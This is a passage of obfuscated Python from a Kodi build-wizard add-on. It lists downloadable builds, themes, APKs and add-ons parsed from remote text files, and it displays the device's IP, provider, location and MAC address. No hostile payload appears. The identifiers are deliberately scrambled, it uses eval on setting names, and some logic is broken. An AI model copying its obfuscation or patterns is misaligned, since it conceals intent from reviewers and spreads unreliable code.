	OO0OOO00OOOO000OO ,O00000O000OOO0O00 ,O00OO00OO0OOOOOO0 =getIP ()#line:2187
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOOO0O000OOO0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2188
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOO00OOOO000OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2189
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00000O000OOO0O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2190
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OO00OO0OOOOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2191
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOOO0O000OOO0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2192
	setView ('files','viewType')#line:2193
def buildMenu ():#line:2195
	if USERNAME =='':#line:2196
		ADDON .openSettings ()#line:2197
		sys .exit ()#line:2198
	if PASSWORD =='':#line:2199
		ADDON .openSettings ()#line:2200
	OO0OO0000OOO00O0O =u_list (SPEEDFILE )#line:2201
	(OO0OO0000OOO00O0O )#line:2202
	O0OO0O0000OOOO00O =(wiz .workingURL (OO0OO0000OOO00O0O ))#line:2203
	(O0OO0O0000OOOO00O )#line:2204
	O0OO0O0000OOOO00O =wiz .workingURL (SPEEDFILE )#line:2205
	if not O0OO0O0000OOOO00O ==True :#line:2206
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2207
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2208
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2209
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2210
		addFile ('%s'%O0OO0O0000OOOO00O ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2211
	else :#line:2212
		OOOOOOO0O00OOOO00 ,OO000O00000OO0000 ,O0O0OOOO0OOOOO0OO ,OOOOO00OOOOOO000O ,OO00OO0O0O00O0OOO ,O000OO00OO00O0OOO ,OO00O0OO00OOO0OOO =wiz .buildCount ()#line:2213
		O0OO0O0O00O0O0O0O =False ;OOO0OO0OOO0OO0OO0 =[]#line:2214
		if THIRDPARTY =='true':#line:2215
			if not THIRD1NAME ==''and not THIRD1URL =='':O0OO0O0O00O0O0O0O =True ;OOO0OO0OOO0OO0OO0 .append ('1')#line:2216
			if not THIRD2NAME ==''and not THIRD2URL =='':O0OO0O0O00O0O0O0O =True ;OOO0OO0OOO0OO0OO0 .append ('2')#line:2217
			if not THIRD3NAME ==''and not THIRD3URL =='':O0OO0O0O00O0O0O0O =True ;OOO0OO0OOO0OO0OO0 .append ('3')#line:2218
		O00OOO00O0O00OOO0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2219
		OOOOO0O00O0O0OOO0 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00OOO00O0O00OOO0 )#line:2220
		if OOOOOOO0O00OOOO00 ==1 and O0OO0O0O00O0O0O0O ==False :#line:2221
			for O0O00O00O0O0OO000 ,O00O00OO0000OOO0O ,O0OOO0OO00000O00O ,O00OO0O000O00OOOO ,OOOO0O00O00OOO00O ,O000000OO000O00OO ,O000O0OOOOOO00OOO ,O000000000OO00O00 ,OO00O0OOO0O0000OO ,O00O0O00O0O00OO00 in OOOOO0O00O0O0OOO0 :#line:2222
				if not SHOWADULT =='true'and OO00O0OOO0O0000OO .lower ()=='yes':continue #line:2223
				if not DEVELOPER =='true'and wiz .strTest (O0O00O00O0O0OO000 ):continue #line:2224
				viewBuild (OOOOO0O00O0O0OOO0 [0 ][0 ])#line:2225
				return #line:2226
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2229
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2230
		if O0OO0O0O00O0O0O0O ==True :#line:2231
			for O0000O00OOOO0OO0O in OOO0OO0OOO0OO0OO0 :#line:2232
				O0O00O00O0O0OO000 =eval ('THIRD%sNAME'%O0000O00OOOO0OO0O )#line:2233
		if len (OOOOO0O00O0O0OOO0 )>=1 :#line:2235
			if SEPERATE =='true':#line:2236
				for O0O00O00O0O0OO000 ,O00O00OO0000OOO0O ,O0OOO0OO00000O00O ,O00OO0O000O00OOOO ,OOOO0O00O00OOO00O ,O000000OO000O00OO ,O000O0OOOOOO00OOO ,O000000000OO00O00 ,OO00O0OOO0O0000OO ,O00O0O00O0O00OO00 in OOOOO0O00O0O0OOO0 :#line:2237
					if not SHOWADULT =='true'and OO00O0OOO0O0000OO .lower ()=='yes':continue #line:2238
					if not DEVELOPER =='true'and wiz .strTest (O0O00O00O0O0OO000 ):continue #line:2239
					OOOO0O00O0000O000 =createMenu ('install','',O0O00O00O0O0OO000 )#line:2240
					addDir ('[%s] %s (v%s)'%(float (OOOO0O00O00OOO00O ),O0O00O00O0O0OO000 ,O00O00OO0000OOO0O ),'viewbuild',O0O00O00O0O0OO000 ,description =O00O0O00O0O00OO00 ,fanart =O000000000OO00O00 ,icon =O000O0OOOOOO00OOO ,menu =OOOO0O00O0000O000 ,themeit =THEME2 )#line:2241
			else :#line:2242
				if OOOOO00OOOOOO000O >0 :#line:2243
					O0O0OOO000000O0O0 ='+'if SHOW17 =='false'else '-'#line:2244
					if SHOW17 =='true':#line:2246
						for O0O00O00O0O0OO000 ,O00O00OO0000OOO0O ,O0OOO0OO00000O00O ,O00OO0O000O00OOOO ,OOOO0O00O00OOO00O ,O000000OO000O00OO ,O000O0OOOOOO00OOO ,O000000000OO00O00 ,OO00O0OOO0O0000OO ,O00O0O00O0O00OO00 in OOOOO0O00O0O0OOO0 :#line:2248
							if not SHOWADULT =='true'and OO00O0OOO0O0000OO .lower ()=='yes':continue #line:2249
							if not DEVELOPER =='true'and wiz .strTest (O0O00O00O0O0OO000 ):continue #line:2250
							OO0OOOOOOOO0OOOO0 =int (float (OOOO0O00O00OOO00O ))#line:2251
							if OO0OOOOOOOO0OOOO0 ==17 :#line:2252
								OOOO0O00O0000O000 =createMenu ('install','',O0O00O00O0O0OO000 )#line:2253
								addDir ('[%s] %s (v%s)'%(float (OOOO0O00O00OOO00O ),O0O00O00O0O0OO000 ,O00O00OO0000OOO0O ),'viewbuild',O0O00O00O0O0OO000 ,description =O00O0O00O0O00OO00 ,fanart =O000000000OO00O00 ,icon =O000O0OOOOOO00OOO ,menu =OOOO0O00O0000O000 ,themeit =THEME2 )#line:2254
				if OO00OO0O0O00O0OOO >0 :#line:2255
					O0O0OOO000000O0O0 ='+'if SHOW18 =='false'else '-'#line:2256
					if SHOW18 =='true':#line:2258
						for O0O00O00O0O0OO000 ,O00O00OO0000OOO0O ,O0OOO0OO00000O00O ,O00OO0O000O00OOOO ,OOOO0O00O00OOO00O ,O000000OO000O00OO ,O000O0OOOOOO00OOO ,O000000000OO00O00 ,OO00O0OOO0O0000OO ,O00O0O00O0O00OO00 in OOOOO0O00O0O0OOO0 :#line:2260
							if not SHOWADULT =='true'and OO00O0OOO0O0000OO .lower ()=='yes':continue #line:2261
							if not DEVELOPER =='true'and wiz .strTest (O0O00O00O0O0OO000 ):continue #line:2262
							OO0OOOOOOOO0OOOO0 =int (float (OOOO0O00O00OOO00O ))#line:2263
							if OO0OOOOOOOO0OOOO0 ==18 :#line:2264
								OOOO0O00O0000O000 =createMenu ('install','',O0O00O00O0O0OO000 )#line:2265
								addDir ('[%s] %s (v%s)'%(float (OOOO0O00O00OOO00O ),O0O00O00O0O0OO000 ,O00O00OO0000OOO0O ),'viewbuild',O0O00O00O0O0OO000 ,description =O00O0O00O0O00OO00 ,fanart =O000000000OO00O00 ,icon =O000O0OOOOOO00OOO ,menu =OOOO0O00O0000O000 ,themeit =THEME2 )#line:2266
				if O0O0OOOO0OOOOO0OO >0 :#line:2267
					O0O0OOO000000O0O0 ='+'if SHOW16 =='false'else '-'#line:2268
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(O0O0OOO000000O0O0 ,O0O0OOOO0OOOOO0OO ),'togglesetting','show16',themeit =THEME3 )#line:2269
					if SHOW16 =='true':#line:2270
						for O0O00O00O0O0OO000 ,O00O00OO0000OOO0O ,O0OOO0OO00000O00O ,O00OO0O000O00OOOO ,OOOO0O00O00OOO00O ,O000000OO000O00OO ,O000O0OOOOOO00OOO ,O000000000OO00O00 ,OO00O0OOO0O0000OO ,O00O0O00O0O00OO00 in OOOOO0O00O0O0OOO0 :#line:2271
							if not SHOWADULT =='true'and OO00O0OOO0O0000OO .lower ()=='yes':continue #line:2272
							if not DEVELOPER =='true'and wiz .strTest (O0O00O00O0O0OO000 ):continue #line:2273
							OO0OOOOOOOO0OOOO0 =int (float (OOOO0O00O00OOO00O ))#line:2274
							if OO0OOOOOOOO0OOOO0 ==16 :#line:2275
								OOOO0O00O0000O000 =createMenu ('install','',O0O00O00O0O0OO000 )#line:2276
								addDir ('[%s] %s (v%s)'%(float (OOOO0O00O00OOO00O ),O0O00O00O0O0OO000 ,O00O00OO0000OOO0O ),'viewbuild',O0O00O00O0O0OO000 ,description =O00O0O00O0O00OO00 ,fanart =O000000000OO00O00 ,icon =O000O0OOOOOO00OOO ,menu =OOOO0O00O0000O000 ,themeit =THEME2 )#line:2277
				if OO000O00000OO0000 >0 :#line:2278
					O0O0OOO000000O0O0 ='+'if SHOW15 =='false'else '-'#line:2279
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(O0O0OOO000000O0O0 ,OO000O00000OO0000 ),'togglesetting','show15',themeit =THEME3 )#line:2280
					if SHOW15 =='true':#line:2281
						for O0O00O00O0O0OO000 ,O00O00OO0000OOO0O ,O0OOO0OO00000O00O ,O00OO0O000O00OOOO ,OOOO0O00O00OOO00O ,O000000OO000O00OO ,O000O0OOOOOO00OOO ,O000000000OO00O00 ,OO00O0OOO0O0000OO ,O00O0O00O0O00OO00 in OOOOO0O00O0O0OOO0 :#line:2282
							if not SHOWADULT =='true'and OO00O0OOO0O0000OO .lower ()=='yes':continue #line:2283
							if not DEVELOPER =='true'and wiz .strTest (O0O00O00O0O0OO000 ):continue #line:2284
							OO0OOOOOOOO0OOOO0 =int (float (OOOO0O00O00OOO00O ))#line:2285
							if OO0OOOOOOOO0OOOO0 <=15 :#line:2286
								OOOO0O00O0000O000 =createMenu ('install','',O0O00O00O0O0OO000 )#line:2287
								addDir ('[%s] %s (v%s)'%(float (OOOO0O00O00OOO00O ),O0O00O00O0O0OO000 ,O00O00OO0000OOO0O ),'viewbuild',O0O00O00O0O0OO000 ,description =O00O0O00O0O00OO00 ,fanart =O000000000OO00O00 ,icon =O000O0OOOOOO00OOO ,menu =OOOO0O00O0000O000 ,themeit =THEME2 )#line:2288
		elif OO00O0OO00OOO0OOO >0 :#line:2289
			if O000OO00OO00O0OOO >0 :#line:2290
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2291
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2292
			else :#line:2293
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2294
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2295
	setView ('files','viewType')#line:2296
def viewBuild (OO00O0OO000O0OO0O ):#line:2298
	O0O0O000O0000OOO0 =wiz .workingURL (SPEEDFILE )#line:2299
	if not O0O0O000O0000OOO0 ==True :#line:2300
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2301
		addFile ('%s'%O0O0O000O0000OOO0 ,'',themeit =THEME3 )#line:2302
		return #line:2303
	if wiz .checkBuild (OO00O0OO000O0OO0O ,'version')==False :#line:2304
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2305
		addFile ('%s was not found in the builds list.'%OO00O0OO000O0OO0O ,'',themeit =THEME3 )#line:2306
		return #line:2307
	O00O000O00O0O0000 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2308
	O00O000OO0OO0OOOO =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO00O0OO000O0OO0O ).findall (O00O000O00O0O0000 )#line:2309
	for O00OO0O0000O00O0O ,OO0O0OO0O0O0OOO0O ,O00000O0000OO0O0O ,OOO0000OOOO00O0O0 ,OO0O0OOOOOO0OO000 ,OO0OOO00OOOOO0000 ,O0OO0OOO00O0O000O ,O0O0O0000OOOOO0OO ,OOOO00O0000O000OO ,OO0OO00O00OOOO00O in O00O000OO0OO0OOOO :#line:2310
		OO0OOO00OOOOO0000 =OO0OOO00OOOOO0000 if wiz .workingURL (OO0OOO00OOOOO0000 )else ICON #line:2311
		O0OO0OOO00O0O000O =O0OO0OOO00O0O000O if wiz .workingURL (O0OO0OOO00O0O000O )else FANART #line:2312
		OOOO0000000O0OO0O ='%s (v%s)'%(OO00O0OO000O0OO0O ,O00OO0O0000O00O0O )#line:2313
		if BUILDNAME ==OO00O0OO000O0OO0O and O00OO0O0000O00O0O >BUILDVERSION :#line:2314
			OOOO0000000O0OO0O ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OOOO0000000O0OO0O ,BUILDVERSION )#line:2315
		O00O0O0OO0O00000O =int (float (KODIV ));OOOOOOO0O0O00OO0O =int (float (OOO0000OOOO00O0O0 ))#line:2324
		if not O00O0O0OO0O00000O ==OOOOOOO0O0O00OO0O :#line:2325
			if O00O0O0OO0O00000O ==16 and OOOOOOO0O0O00OO0O <=15 :O000O0OOO0O0OO0OO =False #line:2326
			else :O000O0OOO0O0OO0OO =True #line:2327
		else :O000O0OOO0O0OO0OO =False #line:2328
		addFile ('התקנה','install',OO00O0OO000O0OO0O ,'fresh',description =OO0OO00O00OOOO00O ,fanart =O0OO0OOO00O0O000O ,icon =OO0OOO00OOOOO0000 ,themeit =THEME1 )#line:2332
		if not OO0O0OOOOOO0OO000 =='http://':#line:2335
			if wiz .workingURL (OO0O0OOOOOO0OO000 )==True :#line:2336
				addFile (wiz .sep ('THEMES'),'',fanart =O0OO0OOO00O0O000O ,icon =OO0OOO00OOOOO0000 ,themeit =THEME3 )#line:2337
				O00O000O00O0O0000 =wiz .openURL (OO0O0OOOOOO0OO000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2338
				O00O000OO0OO0OOOO =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00O000O00O0O0000 )#line:2339
				for OOO000O0O0O00OO00 ,OOOO0OO0O00O00O0O ,OOOO00000000O0OOO ,OO0O000O00O000O0O ,O0000OO0OOO0OOO00 ,OO0OO00O00OOOO00O in O00O000OO0OO0OOOO :#line:2340
					if not SHOWADULT =='true'and O0000OO0OOO0OOO00 .lower ()=='yes':continue #line:2341
					OOOO00000000O0OOO =OOOO00000000O0OOO if OOOO00000000O0OOO =='http://'else OO0OOO00OOOOO0000 #line:2342
					OO0O000O00O000O0O =OO0O000O00O000O0O if OO0O000O00O000O0O =='http://'else O0OO0OOO00O0O000O #line:2343
					addFile (OOO000O0O0O00OO00 if not OOO000O0O0O00OO00 ==BUILDTHEME else "[B]%s (Installed)[/B]"%OOO000O0O0O00OO00 ,'theme',OO00O0OO000O0OO0O ,OOO000O0O0O00OO00 ,description =OO0OO00O00OOOO00O ,fanart =OO0O000O00O000O0O ,icon =OOOO00000000O0OOO ,themeit =THEME3 )#line:2344
	setView ('files','viewType')#line:2345
def viewThirdList (OO00OOO0OOOO0OO00 ):#line:2347
	OOOOOOOO00000OOO0 =eval ('THIRD%sNAME'%OO00OOO0OOOO0OO00 )#line:2348
	OOOOOOO000O0OO000 =eval ('THIRD%sURL'%OO00OOO0OOOO0OO00 )#line:2349
	O00O0O00OO00OO00O =wiz .workingURL (OOOOOOO000O0OO000 )#line:2350
	if not O00O0O00OO00OO00O ==True :#line:2351
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2352
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2353
	else :#line:2354
		O0O0OOOOO0OOO0O0O ,O0O0OOO00OOOO0O0O =wiz .thirdParty (OOOOOOO000O0OO000 )#line:2355
		addFile ("[B]%s[/B]"%OOOOOOOO00000OOO0 ,'',themeit =THEME3 )#line:2356
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2357
		if O0O0OOOOO0OOO0O0O :#line:2358
			for OOOOOOOO00000OOO0 ,O0OOO00O00000000O ,OOOOOOO000O0OO000 ,O0O0O0OOO00O0OO0O ,OOOOO00OOO000OOO0 ,OO0O0000OOOO000OO ,O00O0OO0O0OOO00O0 ,O000OOO0OOOOOOOO0 in O0O0OOO00OOOO0O0O :#line:2359
				if not SHOWADULT =='true'and O00O0OO0O0OOO00O0 .lower ()=='yes':continue #line:2360
				addFile ("[%s] %s v%s"%(O0O0O0OOO00O0OO0O ,OOOOOOOO00000OOO0 ,O0OOO00O00000000O ),'installthird',OOOOOOOO00000OOO0 ,OOOOOOO000O0OO000 ,icon =OOOOO00OOO000OOO0 ,fanart =OO0O0000OOOO000OO ,description =O000OOO0OOOOOOOO0 ,themeit =THEME2 )#line:2361
		else :#line:2362
			for OOOOOOOO00000OOO0 ,OOOOOOO000O0OO000 ,OOOOO00OOO000OOO0 ,OO0O0000OOOO000OO ,O000OOO0OOOOOOOO0 in O0O0OOO00OOOO0O0O :#line:2363
				addFile (OOOOOOOO00000OOO0 ,'installthird',OOOOOOOO00000OOO0 ,OOOOOOO000O0OO000 ,icon =OOOOO00OOO000OOO0 ,fanart =OO0O0000OOOO000OO ,description =O000OOO0OOOOOOOO0 ,themeit =THEME2 )#line:2364
def editThirdParty (OO000OO000O0O00OO ):#line:2366
	OOOOO0OOO00O00000 =eval ('THIRD%sNAME'%OO000OO000O0O00OO )#line:2367
	OOO000OO0OO0OO0OO =eval ('THIRD%sURL'%OO000OO000O0O00OO )#line:2368
	OOO000O00O00OOO0O =wiz .getKeyboard (OOOOO0OOO00O00000 ,'Enter the Name of the Wizard')#line:2369
	OOOOOO0O00O0O0O00 =wiz .getKeyboard (OOO000OO0OO0OO0OO ,'Enter the URL of the Wizard Text')#line:2370
	wiz .setS ('wizard%sname'%OO000OO000O0O00OO ,OOO000O00O00OOO0O )#line:2372
	wiz .setS ('wizard%surl'%OO000OO000O0O00OO ,OOOOOO0O00O0O0O00 )#line:2373
def apkScraper (name =""):#line:2375
	if name =='kodi':#line:2376
		OO0OO0O00000O000O ='http://mirrors.kodi.tv/releases/android/arm/'#line:2377
		O0OO00OO0OOO00O00 ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2378
		OOOOOO0OO0O000O00 =wiz .openURL (OO0OO0O00000O000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2379
		O0O0000OOO0OO0OO0 =wiz .openURL (O0OO00OO0OOO00O00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2380
		OO0000O00000O000O =0 #line:2381
		OOOOO00O0OO0O0O0O =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OOOOOO0OO0O000O00 )#line:2382
		O0OO0000000O0OOOO =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O0O0000OOO0OO0OO0 )#line:2383
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2385
		OOO000OOOOOO0OO00 =False #line:2386
		for O0O00OO0O000OO000 ,name ,OOOOOO0000O0O0000 ,O0OO00000OO000O00 in OOOOO00O0OO0O0O0O :#line:2387
			if O0O00OO0O000OO000 in ['../','old/']:continue #line:2388
			if not O0O00OO0O000OO000 .endswith ('.apk'):continue #line:2389
			if not O0O00OO0O000OO000 .find ('_')==-1 and OOO000OOOOOO0OO00 ==True :continue #line:2390
			try :#line:2391
				OO0OOOO0O000OO0OO =name .split ('-')#line:2392
				if not O0O00OO0O000OO000 .find ('_')==-1 :#line:2393
					OOO000OOOOOO0OO00 =True #line:2394
					O0OOO00OO0O0O0O0O ,OOOO0000O0000OOOO =OO0OOOO0O000OO0OO [2 ].split ('_')#line:2395
				else :#line:2396
					O0OOO00OO0O0O0O0O =OO0OOOO0O000OO0OO [2 ]#line:2397
					OOOO0000O0000OOOO =''#line:2398
				OOOO00OOO0000O0O0 ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OOOO0O000OO0OO [0 ].title (),OO0OOOO0O000OO0OO [1 ],OOOO0000O0000OOOO .upper (),O0OOO00OO0O0O0O0O ,COLOR2 ,OOOOOO0000O0O0000 .replace (' ',''),COLOR1 ,O0OO00000OO000O00 )#line:2399
				OO000OOO0O00OOO00 =urljoin (OO0OO0O00000O000O ,O0O00OO0O000OO000 )#line:2400
				addFile (OOOO00OOO0000O0O0 ,'apkinstall',"%s v%s%s %s"%(OO0OOOO0O000OO0OO [0 ].title (),OO0OOOO0O000OO0OO [1 ],OOOO0000O0000OOOO .upper (),O0OOO00OO0O0O0O0O ),OO000OOO0O00OOO00 )#line:2401
				OO0000O00000O000O +=1 #line:2402
			except :#line:2403
				wiz .log ("Error on: %s"%name )#line:2404
		for O0O00OO0O000OO000 ,name ,OOOOOO0000O0O0000 ,O0OO00000OO000O00 in O0OO0000000O0OOOO :#line:2406
			if O0O00OO0O000OO000 in ['../','old/']:continue #line:2407
			if not O0O00OO0O000OO000 .endswith ('.apk'):continue #line:2408
			if not O0O00OO0O000OO000 .find ('_')==-1 :continue #line:2409
			try :#line:2410
				OO0OOOO0O000OO0OO =name .split ('-')#line:2411
				OOOO00OOO0000O0O0 ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OOOO0O000OO0OO [0 ].title (),OO0OOOO0O000OO0OO [1 ],OO0OOOO0O000OO0OO [2 ],COLOR2 ,OOOOOO0000O0O0000 .replace (' ',''),COLOR1 ,O0OO00000OO000O00 )#line:2412
				OO000OOO0O00OOO00 =urljoin (O0OO00OO0OOO00O00 ,O0O00OO0O000OO000 )#line:2413
				addFile (OOOO00OOO0000O0O0 ,'apkinstall',"%s v%s %s"%(OO0OOOO0O000OO0OO [0 ].title (),OO0OOOO0O000OO0OO [1 ],OO0OOOO0O000OO0OO [2 ]),OO000OOO0O00OOO00 )#line:2414
				OO0000O00000O000O +=1 #line:2415
			except :#line:2416
				wiz .log ("Error on: %s"%name )#line:2417
		if OO0000O00000O000O ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2418
	elif name =='spmc':#line:2419
		O0O0O00OO000O000O ='https://github.com/koying/SPMC/releases'#line:2420
		OOOOOO0OO0O000O00 =wiz .openURL (O0O0O00OO000O000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2421
		OO0000O00000O000O =0 #line:2422
		OOOOO00O0OO0O0O0O =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OOOOOO0OO0O000O00 )#line:2423
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2425
		for name ,O00OOO00O00OO0OO0 in OOOOO00O0OO0O0O0O :#line:2427
			O00O000O0O0000OO0 =''#line:2428
			O0OO0000000O0OOOO =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O00OOO00O00OO0OO0 )#line:2429
			for OO000OOO0OO0OO0OO ,O0OO0000O0OO000OO ,O00OOO000OO00OOO0 in O0OO0000000O0OOOO :#line:2430
				if O00OOO000OO00OOO0 .find ('armeabi')==-1 :continue #line:2431
				if O00OOO000OO00OOO0 .find ('launcher')>-1 :continue #line:2432
				O00O000O0O0000OO0 =urljoin ('https://github.com',OO000OOO0OO0OO0OO )#line:2433
				break #line:2434
		if OO0000O00000O000O ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2436
def apkMenu (url =None ):#line:2438
	if url ==None :#line:2439
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2442
	if not APKFILE =='http://':#line:2443
		if url ==None :#line:2444
			O00O0OO0O0OO00OOO =wiz .workingURL (APKFILE )#line:2445
			O0OO0OOOO00O0OO0O =uservar .APKFILE #line:2446
		else :#line:2447
			O00O0OO0O0OO00OOO =wiz .workingURL (url )#line:2448
			O0OO0OOOO00O0OO0O =url #line:2449
		if O00O0OO0O0OO00OOO ==True :#line:2450
			O00O00O0O0000O00O =wiz .openURL (O0OO0OOOO00O0OO0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2451
			OO0O0000O000OO0OO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00O00O0O0000O00O )#line:2452
			if len (OO0O0000O000OO0OO )>0 :#line:2453
				OO0O000000O0OO0OO =0 #line:2454
				for OOOOOO0OO0OO0OO00 ,O00O00O0O00000OO0 ,url ,OO0O0OO0OOO000O0O ,OO00000OOO0OO00O0 ,OOOO00O0OO0O0O000 ,OO0O0OO00000O00O0 in OO0O0000O000OO0OO :#line:2455
					if not SHOWADULT =='true'and OOOO00O0OO0O0O000 .lower ()=='yes':continue #line:2456
					if O00O00O0O00000OO0 .lower ()=='yes':#line:2457
						OO0O000000O0OO0OO +=1 #line:2458
						addDir ("[B]%s[/B]"%OOOOOO0OO0OO0OO00 ,'apk',url ,description =OO0O0OO00000O00O0 ,icon =OO0O0OO0OOO000O0O ,fanart =OO00000OOO0OO00O0 ,themeit =THEME3 )#line:2459
					else :#line:2460
						OO0O000000O0OO0OO +=1 #line:2461
						addFile (OOOOOO0OO0OO0OO00 ,'apkinstall',OOOOOO0OO0OO0OO00 ,url ,description =OO0O0OO00000O00O0 ,icon =OO0O0OO0OOO000O0O ,fanart =OO00000OOO0OO00O0 ,themeit =THEME2 )#line:2462
					if OO0O000000O0OO0OO <1 :#line:2463
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2464
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2465
		else :#line:2466
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2467
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2468
			addFile ('%s'%O00O0OO0O0OO00OOO ,'',themeit =THEME3 )#line:2469
		return #line:2470
	else :wiz .log ("[APK Menu] No APK list added.")#line:2471
	setView ('files','viewType')#line:2472
def addonMenu (url =None ):#line:2474
	if not ADDONFILE =='http://':#line:2475
		if url ==None :#line:2476
			OO0O0OO00OO0O0000 =wiz .workingURL (ADDONFILE )#line:2477
			O0000O0O00OO0OO00 =uservar .ADDONFILE #line:2478
		else :#line:2479
			OO0O0OO00OO0O0000 =wiz .workingURL (url )#line:2480
			O0000O0O00OO0OO00 =url #line:2481
		if OO0O0OO00OO0O0000 ==True :#line:2482
			O0OOOOOO0O0O0OO00 =wiz .openURL (O0000O0O00OO0OO00 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2483
			OO000OOOOOOO0O0O0 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OOOOOO0O0O0OO00 )#line:2484
			if len (OO000OOOOOOO0O0O0 )>0 :#line:2485
				O000000OOO000O0O0 =0 #line:2486
				for OOOOO0OO0OO00O000 ,O00O0OO0O00OO0OOO ,url ,OOO00O0OO0O000O0O ,O0OO0O0O000000000 ,OOO00O0O00O00O0OO ,OO0000000OO0OOO0O ,O0O00OO0O0OO00000 ,OOO000O000OO000OO ,OOOO0O0O0O0OOOOOO in OO000OOOOOOO0O0O0 :#line:2487
					if O00O0OO0O00OO0OOO .lower ()=='section':#line:2488
						O000000OOO000O0O0 +=1 #line:2489
						addDir ("[B]%s[/B]"%OOOOO0OO0OO00O000 ,'addons',url ,description =OOOO0O0O0O0OOOOOO ,icon =OO0000000OO0OOO0O ,fanart =O0O00OO0O0OO00000 ,themeit =THEME3 )#line:2490
					else :#line:2491
